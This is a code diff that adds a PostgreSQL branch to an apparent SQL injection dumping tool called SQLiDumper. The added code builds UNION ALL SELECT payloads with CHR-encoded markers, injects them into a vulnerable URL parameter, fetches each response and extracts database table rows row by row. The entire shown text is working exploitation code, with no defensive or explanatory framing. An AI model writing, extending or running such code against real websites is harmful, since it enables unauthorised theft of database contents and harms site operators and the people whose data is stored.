@@ -692,6 +692,49 @@ class SQLiDumper:
                 if rows:
                     break
         
+        elif sqli.dbms == "postgresql":
+            # PostgreSQL: COALESCE + CAST + || concatenation
+            concat_cols = "||CHR(124)||CHR(124)||".join(
+                [f"COALESCE(CAST({c} AS TEXT),'NULL')" for c in columns]
+            )
+            marker_s = f"mdd{random.randint(10000,99999)}"
+            marker_e = f"mdx{random.randint(10000,99999)}"
+            marker_s_chr = "||".join([f"CHR({ord(ch)})" for ch in marker_s])
+            marker_e_chr = "||".join([f"CHR({ord(ch)})" for ch in marker_e])
+            
+            for col_idx in sqli.injectable_columns:
+                found_any = False
+                for row_idx in range(limit):
+                    null_list_copy = null_list.copy()
+                    null_list_copy[col_idx] = (
+                        f"{marker_s_chr}||{concat_cols}||{marker_e_chr}"
+                    )
+                    query = (
+                        f"{prefix}UNION ALL SELECT {','.join(null_list_copy)} "
+                        f"FROM {table} LIMIT 1 OFFSET {row_idx}{suffix}"
+                    )
+                    test_params = params.copy()
+                    test_params[sqli.parameter] = [self._inject_value(original, query, is_replace)]
+                    test_url = scanner._build_url(base, test_params)
+                    body, _ = await scanner._fetch(test_url, session)
+                    if not body:
+                        break
+                    match = re.search(rf'{re.escape(marker_s)}(.+?){re.escape(marker_e)}', body, re.S)
+                    if not match:
+                        if row_idx == 0:
+                            break
+                        break
+                    found_any = True
+                    raw = match.group(1).strip()
+                    if not raw:
+                        break
+                    values = raw.split("||")
+                    if len(values) >= len(columns):
+                        row = {columns[i]: values[i].strip() for i in range(len(columns))}
+                        rows.append(row)
+                if found_any:
+                    break
+        
         logger.info(f"Extracted {len(rows)} rows from {table} ({', '.join(columns[:5])}...)")
         return rows
 
